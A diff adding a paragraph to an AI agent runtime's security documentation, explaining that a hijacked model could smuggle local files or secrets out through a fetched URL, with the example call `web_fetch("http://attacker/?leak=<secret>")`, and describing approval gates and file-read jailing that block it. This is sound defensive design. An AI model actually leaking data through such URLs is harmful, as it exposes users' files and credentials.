@@ -58,6 +58,16 @@ caps the blast radius is the gate model: even a fully hijacked model cannot send
 publish without your approval (`ask_first`), and cannot do anything on the never-list at all
 (`never`). Treat the gates — not the prompt — as the real boundary.
 
+**Egress is gated too, to stop exfiltration.** A fetched URL is an outbound channel: a hijacked
+model could read a local file (or its own memory, or your inbox) and smuggle it out in the URL —
+`web_fetch("http://attacker/?leak=<secret>")` — with no send/post involved. So `web_fetch` is
+**`ask_first` by default**: an exfiltration attempt surfaces an approval showing you the suspicious
+URL, and you deny it. `read_file` is also jailed to the working dir (and refuses secret files), so
+the model can't reach `/etc/passwd` or your SSH keys in the first place. If you want the agent to
+research the web hands-free, set `tools.web_fetch.autonomous: true` — knowing that re-opens this
+channel. (`verify_website` stays autonomous: it builds its own candidate domains from a business
+name, so the model can't smuggle data into its request.)
+
 One exception worth knowing: with `provider: claude-code`, the agent hands the task to the
 `claude -p` CLI, which runs its own tools under Claude Code's own permission prompts. This
 runtime's `ask_first` / `never` gates are **not** consulted for that provider — manage safety
